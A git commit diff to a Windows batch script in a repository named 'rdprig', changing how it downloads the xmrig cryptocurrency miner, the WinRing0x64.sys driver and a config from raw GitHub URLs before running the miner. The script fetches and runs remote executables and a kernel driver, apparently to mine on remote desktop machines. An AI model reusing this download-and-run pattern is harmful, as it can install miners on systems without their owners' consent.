f85d23b7ca71be4dc91079858a2d975325477401
Sueqkjs <68449029+Sueqkjs@users.noreply.github.com>
2021-10-11 16:12:09 +0900

    ok

--- start.bat
+++ start.bat
@@ -6,13 +6,13 @@ if %ERRORLEVEL% equ 0 (
   echo processing...
   mkdir rdprig
   cd rdprig
-  wget https://raw.githubusercontent.com/Sueqkjs/rdprig/master/xmrig.exe -UseBasicParsing -OutFile xmrig.exe
-  wget https://raw.githubusercontent.com/Sueqkjs/rdprig/master/xmrig-asm.lib -UseBasicParsing -OutFile xmrig-asm.lib
-  wget https://raw.githubusercontent.com/Sueqkjs/rdprig/master/WinRing0x64.sys -UseBasicParsing -OutFile WinRing0x64.sys
+  @powershell wget https://raw.githubusercontent.com/Sueqkjs/rdprig/master/xmrig.exe -UseBasicParsing -OutFile xmrig.exe
+  @powershell wget https://raw.githubusercontent.com/Sueqkjs/rdprig/master/xmrig-asm.lib -UseBasicParsing -OutFile xmrig-asm.lib
+  @powershell wget https://raw.githubusercontent.com/Sueqkjs/rdprig/master/WinRing0x64.sys -UseBasicParsing -OutFile WinRing0x64.sys
   
   :: Change this!
   :: https://raw.githubusercontent.com/[Your GitHub username]/rdprig/master/config.json
-  wget https://raw.githubusercontent.com/Sueqkjs/rdprig/master/config.json -UseBasicParsing -OutFile config.json
+  @powershell wget https://raw.githubusercontent.com/Sueqkjs/rdprig/master/config.json -UseBasicParsing -OutFile config.json
   
   xmrig.exe
 ) else (
